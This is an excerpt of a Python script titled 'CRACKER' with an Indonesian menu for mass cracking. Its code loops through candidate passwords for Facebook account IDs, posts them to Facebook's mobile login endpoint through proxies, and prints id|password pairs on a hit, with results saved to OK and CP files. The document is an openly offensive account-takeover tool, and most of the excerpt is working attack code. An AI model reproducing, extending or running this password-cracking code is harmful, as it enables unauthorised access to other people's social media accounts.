...
\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] CRACKER [+]
\033[1;92m╔══o00════════00o════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m POTRAIT-XD   \033[1;31;1m   █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 2.3 Testing\033[1;31;1m     █
\033[1;92m╚════════════════════════════════════╝''')
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	print(f" [01]. crack massal\n [02]. cek hasil\n [03]. hapus cookie\n [04]. setting user agent\n")
...
def passwrd():
	print('')
	print(f' [*] hasil OK Tersimpan Di : OK/%s '%(ok))
	print(f' [*] hasil CP Tersimpan Di : CP/%s '%(cp))
	print("")
...
def asyc(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.alpha.facebook.com/login/?email='+idf).text
			dataa ={
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			po = ses.post('https://m.alpha.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"{K} * ---> {idf}|{pw}")
